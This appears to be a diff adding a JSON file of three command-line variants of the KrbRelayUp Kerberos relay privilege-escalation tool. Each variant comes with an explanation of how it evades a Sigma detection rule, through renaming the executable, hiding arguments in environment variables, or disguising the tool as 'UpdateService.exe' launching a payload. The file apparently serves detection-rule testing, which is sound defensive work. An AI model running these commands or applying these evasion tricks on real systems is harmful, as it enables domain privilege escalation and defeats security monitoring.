@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy KrbRelayUp.exe benign_tool.exe && .\\benign_tool.exe relay -Domain contoso.local -ComputerName target-host$",
+    "explanation": "This command renames the executable to avoid direct detection and uses standard command-line syntax. It preserves the original behavior for testing purposes."
+  },
+  {
+    "output": "set cmdArg1=krbscm && set cmdArg2=-sc && .\\KrbRelayUp.exe %cmdArg1% %cmdArg2%",
+    "explanation": "This command uses environment variables to obfuscate the command-line arguments while maintaining the same behavior as the original test command."
+  },
+  {
+    "output": "UpdateService.exe \"spawn\" \"-d\" contoso.local \"-cn\" target-host$ \"-cp\" C:\\Tools\\payload.exe",
+    "explanation": "This command uses quotes and reordered arguments to simulate a test case that aligns with the Sigma rule's detection logic while appearing different."
+  }
+]
